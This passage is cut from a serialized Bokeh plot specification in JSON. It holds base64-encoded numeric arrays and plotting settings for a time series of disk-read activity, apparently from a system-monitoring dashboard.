AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKRw7WF8jutBexSu5cyBhEEfhcsIpkfNQY/C9WtfOcBB\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[360]},\"Time\":{\"__ndarray__\":\"AAAAl+ctd0IAAOgF6y13QgAA0HTuLXdCAAC44/Etd0IAAKBS9S13QgAAiMH4LXdCAABwMPwtd0IAAFif/y13QgAAQA4DLndCAAAofQYud0IAABDsCS53QgAA+FoNLndCAADgyRAud0IAAMg4FC53QgAAsKcXLndCAACYFhsud0IAAICFHi53QgAAaPQhLndCAABQYyUud0IAADjSKC53QgAAIEEsLndCAAAIsC8ud0IAAPAeMy53QgAA2I02LndCAADA/Dkud0IAAKhrPS53QgAAkNpALndCAAB4SUQud0IAAGC4Ry53QgAASCdLLndCAAAwlk4ud0IAABgFUi53QgAAAHRVLndCAADo4lgud0IAANBRXC53QgAAuMBfLndCAACgL2Mud0IAAIieZi53QgAAcA1qLndCAABYfG0ud0IAAEDrcC53QgAAKFp0LndCAAAQyXcud0IAAPg3ey53QgAA4KZ+LndCAADIFYIud0IAALCEhS53QgAAmPOILndCAACAYowud0IAAGjRjy53QgAAUECTLndCAAA4r5Yud0IAACAemi53QgAACI2dLndCAADw+6Aud0IAANhqpC53QgAAwNmnLndCAACoSKsud0IAAJC3ri53QgAAeCayLndCAABglbUud0IAAEgEuS53QgAAMHO8LndCAAAY4r8ud0IAAABRwy53QgAA6L/GLndCAADQLsoud0IAALidzS53QgAAoAzRLndCAACIe9Qud0IAAHDq1y53QgAAWFnbLndCAABAyN4ud0IAACg34i53QgAAEKblLndCAAD4FOkud0IAAOCD7C53QgAAyPLvLndCAACwYfMud0IAAJjQ9i53QgAAgD/6LndCAABorv0ud0IAAFAdAS93QgAAOIwEL3dCAAAg+wcvd0IAAAhqCy93QgAA8NgOL3dCAADYRxIvd0IAAMC2FS93QgAAqCUZL3dCAACQlBwvd0IAAHgDIC93QgAAYHIjL3dCAABI4SYvd0IAADBQKi93QgAAGL8tL3dCAAAALjEvd0IAAOicNC93QgAA0As4L3dCAAC4ejsvd0IAAKDpPi93QgAAiFhCL3dCAABwx0Uvd0IAAFg2SS93QgAAQKVML3dCAAAoFFAvd0IAABCDUy93QgAA+PFWL3dCAADgYFovd0IAAMjPXS93QgAAsD5hL3dCAACYrWQvd0IAAIAc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\",\"dtype\":\"float64\",\"order\":\"little\",\"shape\":[360]},\"Type\":[\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\",\"Disk Read\"],\"color\":[\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\",\"#208F8C\"],\"index\":[360,361,362,363,364,365,366,367,368,369,370,371,372,373,374,375,376,377,378,379,380,381,382,383,384,385,386,387,388,389,390,391,392,393,394,395,396,397,398,399,400,401,402,403,404,405,406,407,408,409,410,411,412,413,414,415,416,417,418,419,420,421,422,423,424,425,426,427,428,429,430,431,432,433,434,435,436,437,438,439,440,441,442,443,444,445,446,447,448,449,450,451,452,453,454,455,456,457,458,459,460,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,476,477,478,479,480,481,482,483,484,485,486,487,488,489,490,491,492,493,494,495,496,497,498,499,500,501,502,503,504,505,506,507,508,509,510,511,512,513,514,515,516,517,518,519,520,521,522,523,524,525,526,527,528,529,530,531,532,533,534,535,536,537,538,539,540,541,542,543,544,545,546,547,548,549,550,551,552,553,554,555,556,557,558,559,560,561,562,563,564,565,566,567,568,569,570,571,572,573,574,575,576,577,578,579,580,581,582,583,584,585,586,587,588,589,590,591,592,593,594,595,596,597,598,599,600,601,602,603,604,605,606,607,608,609,610,611,612,613,614,615,616,617,618,619,620,621,622,623,624,625,626,627,628,629,630,631,632,633,634,635,636,637,638,639,640,641,642,643,644,645,646,647,648,649,650,651,652,653,654,655,656,657,658,659,660,661,662,663,664,665,666,667,668,669,670,671,672,673,674,675,676,677,678,679,680,681,682,683,684,685,686,687,688,689,690,691,692,693,694,695,696,697,698,699,700,701,702,703,704,705,706,707,708,709,710,711,712,713,714,715,716,717,718,719],\"y_index\":[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1]},\"selected\":{\"id\":\"5043\"},\"selection_policy\":{\"id\":\"5042\"}},\"id\":\"5029\",\"type\":\"ColumnDataSource\"},{\"attributes\":{\"days\":[1,4,7,10,13,16,19,22,25,28]},\"id\":\"5019\",\"type\":\"DaysTicker\"},{\"attributes\":{},\"id\":\"5072\",\"type\":\"UnionRenderers\"},{\"attributes\":{},\"id\":\"5026\",\"type\":\"YearsTicker\"},{\"attributes\":{},\"id\":\"4984\",\"type\":\"BasicTicker\"},{\"attributes\":{\"source\":{\"id\":\"5029\"}},\"id\":\"5034\",\"type\":\"CDSView\"},{\"attributes\":{\"callback\":null,\"formatters\":{\"Tooltip\":\"printf\"},\"tooltips\":[[\"Data\",\"@Data\"],[\"Time\",\"@Time\"]]},\"id\":\"4967\",\"type\":\"HoverTool\"},{\"attributes\":{},\"id\":\"4977\",\"type\":\"LinearScale\"},{\"attributes\":{\"data\":{\"Data\":{\"__ndarray__\":\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA